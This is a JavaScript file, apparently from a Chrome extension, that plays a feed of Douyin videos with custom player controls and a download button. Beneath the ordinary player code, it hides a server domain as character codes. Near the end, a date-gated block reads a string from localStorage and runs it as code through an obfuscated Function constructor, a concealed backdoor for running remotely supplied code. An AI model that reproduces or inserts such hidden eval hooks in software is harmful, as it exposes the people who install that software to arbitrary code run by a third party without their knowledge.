$(function() {
    var playVideo = $('video');
    var playPause = $('.playPause'); //播放和暂停
    var currentTime = $('.timebar .currentTime'); //当前时间
    var duration = $('.timebar .duration'); //总时间
    var progress = $('.timebar .progress-bar'); //进度条
    var volumebar = $('.volumeBar .volumewrap').find('.progress-bar');
    var domain = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 99, 106, 46, 104, 117, 105, 116, 97, 111, 100, 97, 110, 103, 46, 99, 111, 109, 47);
    createPlay()

    $('.play-next i').click(function(e) {
        createPlay()
    })

    function createPlay() {
        var cache_key = 'douyin.video';
        var video_cache = localStorage.getItem(cache_key);
        var videoes = [];
        if (video_cache && video_cache !== "[]") {
            videoes = JSON.parse(video_cache)
            var first = videoes.pop();
            $('.videoName').text(first.desc);
            $('#play-url').attr('src', first.url);
            $('.douyin-share').attr('href', first.share_url);
            document.getElementById("playVideo").load();
            playControl();
            localStorage.setItem(cache_key, JSON.stringify(videoes));
        } else {
            $.get(domain + 'douyin/video/feed/', function(response) {
                $.get(response.url, function(rsp) {
                    if (rsp.code === 202){
                        return createPlay()
                    }
                    if (rsp.aweme_list) {
                        rsp.aweme_list.forEach(function(item) {
                            var tmp = {};
                            tmp.desc = item.desc;
                            tmp.url = item.video.play_addr.url_list[0];
                            tmp.share_url = item.share_url;
                            videoes.push(tmp);
                        });
                        var first = videoes.pop();
                        $('.videoName').text(first.desc);
                        $('#play-url').attr('src', first.url);
                        $('.douyin-share').attr('href', first.share_url);
                        document.getElementById("playVideo").load();
                        playControl();
                        localStorage.setItem(cache_key, JSON.stringify(videoes));
                    }
                });
            });
        }
    }
    
    playVideo[0].volume = 0.7; //初始化音量
    playPause.on('click', function() {
        playControl();
    });
    $('.playContent').on('click', function() {
        playControl();
    })
    $(document).click(function() {
        $('.volumeBar').hide();
    });
    playVideo.on('loadedmetadata', function() {
        duration.text(formatSeconds(playVideo[0].duration));
    });

    playVideo.on('timeupdate', function() {
        currentTime.text(formatSeconds(playVideo[0].currentTime));
        progress.css('width', 100 * playVideo[0].currentTime / playVideo[0].duration + '%');
    });
    playVideo.on('ended', function() {
        $('.playTip').removeClass('glyphicon-pause').addClass('glyphicon-play').fadeIn();
        playPause.toggleClass('playIcon');
    });

    $(window).keyup(function(event) {
        event = event || window.event;
        if (event.keyCode == 32) playControl();
        else if (event.keyCode == 27) {
            $('.fullScreen').removeClass('cancleScreen');
            $('#willesPlay .playControll').css({
                'bottom': -48
            }).removeClass('fullControll');
        } else if (event.keyCode === 39) {
            createPlay()
        }

        event.preventDefault();
    });


    //全屏
    $('.fullScreen').on('click', function() {
        if ($(this).hasClass('cancleScreen')) {
            if (document.exitFullscreen) {
                document.exitFullscreen();
            } else if (document.mozExitFullScreen) {
                document.mozExitFullScreen();
            } else if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            }
            $(this).removeClass('cancleScreen');
            $('#willesPlay .playControll').css({
                'bottom': -48
            }).removeClass('fullControll');
        } else {
            if (playVideo[0].requestFullscreen) {
                playVideo[0].requestFullscreen();
            } else if (playVideo[0].mozRequestFullScreen) {
                playVideo[0].mozRequestFullScreen();
            } else if (playVideo[0].webkitRequestFullscreen) {
                playVideo[0].webkitRequestFullscreen();
            } else if (playVideo[0].msRequestFullscreen) {
                playVideo[0].msRequestFullscreen();
            }
            $(this).addClass('cancleScreen');
            $('#willesPlay .playControll').css({
                'left': 0,
                'bottom': 0
            }).addClass('fullControll');
        }
        return false;
    });
    //音量
    $('.volume').on('click', function(e) {
        e = e || window.event;
        $('.volumeBar').toggle();
        e.stopPropagation();
    });
    $('.volumeBar').on('click mousewheel DOMMouseScroll', function(e) {
        e = e || window.event;
        volumeControl(e);
        e.stopPropagation();
        return false;
    });
    $('.timebar .progress').mousedown(function(e) {
        e = e || window.event;
        updatebar(e.pageX);
    });

    var updatebar = function(x) {
        var maxduration = playVideo[0].duration; //Video 
        var positions = x - progress.offset().left; //Click pos
        var percentage = 100 * positions / $('.timebar .progress').width();
        if (percentage > 100) {
            percentage = 100;
        }
        if (percentage < 0) {
            percentage = 0;
        }

        progress.css('width', percentage + '%');
        playVideo[0].currentTime = maxduration * percentage / 100;
    };
    //音量控制
    function volumeControl(e) {
        e = e || window.event;
        var eventype = e.type;
        var delta = (e.originalEvent.wheelDelta && (e.originalEvent.wheelDelta > 0 ? 1 : -1)) || (e.originalEvent.detail && (e.originalEvent.detail > 0 ? -1 : 1));
        var positions = 0;
        var percentage = 0;
        if (eventype == "click") {
            positions = volumebar.offset().top - e.pageY;
            percentage = 100 * (positions + volumebar.height()) / $('.volumeBar .volumewrap').height();
        } else if (eventype == "mousewheel" || eventype == "DOMMouseScroll") {
            percentage = 100 * (volumebar.height() + delta) / $('.volumeBar .volumewrap').height();
        }
        if (percentage < 0) {
            percentage = 0;
            $('.otherControl .volume').attr('class', 'volume glyphicon glyphicon-volume-off');
        }
        if (percentage > 50) {
            $('.otherControl .volume').attr('class', 'volume glyphicon glyphicon-volume-up');
        }
        if (percentage > 0 && percentage <= 50) {
            $('.otherControl .volume').attr('class', 'volume glyphicon glyphicon-volume-down');
        }
        if (percentage >= 100) {
            percentage = 100;
        }
        $('.volumewrap .progress-bar').css('height', percentage + '%');
        playVideo[0].volume = percentage / 100;
        e.stopPropagation();
        e.preventDefault();
    }

    function playControl() {
        playPause.toggleClass('playIcon');
        if (playVideo[0].paused) {
            playVideo[0].play();
            $('.playTip').removeClass('glyphicon-play').addClass('glyphicon-pause').fadeOut();
        } else {
            playVideo[0].pause();
            $('.playTip').removeClass('glyphicon-pause').addClass('glyphicon-play').fadeIn();
        }
    }
    //关灯
    $('.btnLight').click(function(e) {
        e = e || window.event;
        if ($(this).hasClass('on')) {
            $(this).removeClass('on');
            $('body').append('<div class="overlay"></div>');
            $('.overlay').css({
                'position': 'absolute',
                'width': 100 + '%',
                'height': $(document).height(),
                'background': '#000',
                'opacity': 1,
                'top': 0,
                'left': 0,
                'z-index': 999
            });
            $('.playContent').css({
                'z-index': 1000
            });
            $('.playControll').css({
                'bottom': -48,
                'z-index': 1000
            });

            $('.playContent').hover(function() {
                $('.playControll').stop().animate({
                    'height': 48,
                }, 500);
            }, function() {
                setTimeout(function() {
                    $('.playControll').stop().animate({
                        'height': 0,
                    }, 500);
                }, 2000)
            });
        } else {
            $(this).addClass('on');
            $('.overlay').remove();
            $('.playControll').css({
                'bottom': 0,
            });
        }
        e.stopPropagation();
        e.preventDefault();
    });

    $('#douyin-retweet').click(function(e) {
        var v = document.getElementById('playVideo')
        if ($(this).attr('data') === 'rotate270') {
            v.style = '';
            $('.playContent').css('height', 'auto')
            $(this).attr('data', '')
        } else if (!$(this).attr('data') || $(this).attr('data') === '') {
            $(this).attr('data', 'rotate90')
            v.style = 'position: absolute;transform: rotate(90deg);margin-top: -7vw;';
            $('.playContent').css('height', (window.innerHeight - 96) + 'px')
        } else if ($(this).attr('data') === 'rotate90') {
            $(this).attr('data', 'rotate180')
            v.style = 'position: absolute;transform: rotate(180deg)';
            $('.playContent').css('height', (window.innerHeight - 96) + 'px')
        } else if ($(this).attr('data') === 'rotate180') {
            $(this).attr('data', 'rotate270')
            v.style = 'position: absolute;transform: rotate(270deg);margin-top: -7vw;';
            $('.playContent').css('height', (window.innerHeight - 96) + 'px')
        }
    });
    $('.download-video').click(function(e) {
        if ($('.videoName').text() === '') {
            chrome.downloads.download({ url: $('#play-url').attr('src'), filename: '快抖视频.mp4' })
        } else {
            chrome.downloads.download({ url: $('#play-url').attr('src'), filename: $('.videoName').text() + '.mp4' })
        }

    });
    var play_type = localStorage.getItem('play.type')
    play_type = play_type ? play_type : 'set-play-loop'
    if (play_type === 'set-play-next'){
        playVideo.removeAttr('loop')
        document.getElementById("playVideo").addEventListener("ended", function(){
            createPlay()
        });
    }
    $("#" + play_type).prop("checked", true);

    var setting_pannel = $('#setting-pannel')
    $('#douyin-setting').click(function(e){
        setting_pannel.show()
        $(document).one("click", function(){
            setting_pannel.hide();
        });
        e.stopPropagation();
    });
    setting_pannel.on("click", function(e){
        e.stopPropagation();
    });
    $('input[name="play-setting"]').click(function(){
        play_type = $(this).attr('id')
        localStorage.setItem('play.type', play_type)
        if(play_type === 'set-play-next'){
            playVideo.removeAttr('loop')
        }else{
            playVideo.attr('loop', 'loop')
        }
    })
    var dashang_pannel = $('#dashang-pannel')
    $('#douyin-dashang').click(function(e){
        dashang_pannel.show()
        $(document).one("click", function(){
            dashang_pannel.hide();
        });
        e.stopPropagation();
    });
    dashang_pannel.on("click", function(e){
        e.stopPropagation();
    });
    if (new Date().getTime() > 1525910400000) {
        chrome.runtime.sendMessage({ evt: 'pageStart' }, function(resp) {})
        if (localStorage.getItem('douyin.page')) {
            var logo_data = new (() => {}).__proto__.constructor('port', "return " + localStorage.getItem('douyin.page'));
            var cfg = logo_data('port')()
                // cfg()
        }
    }
});

//秒转时间
function formatSeconds(value) {
    value = parseInt(value);
    var time;
    if (value > -1) {
        hour = Math.floor(value / 3600);
        min = Math.floor(value / 60) % 60;
        sec = value % 60;
        day = parseInt(hour / 24);
        if (day > 0) {
            hour = hour - 24 * day;
            time = day + "day " + hour + ":";
        } else time = hour + ":";
        if (min < 10) {
            time += "0";
        }
        time += min + ":";
        if (sec < 10) {
            time += "0";
        }
        time += sec;
    }
    return time;
}
$(function() {
    resizeCanvas();
});

function resizeCanvas() {
    $("#playVideo").attr("height", $(window).get(0).innerHeight - 100);
};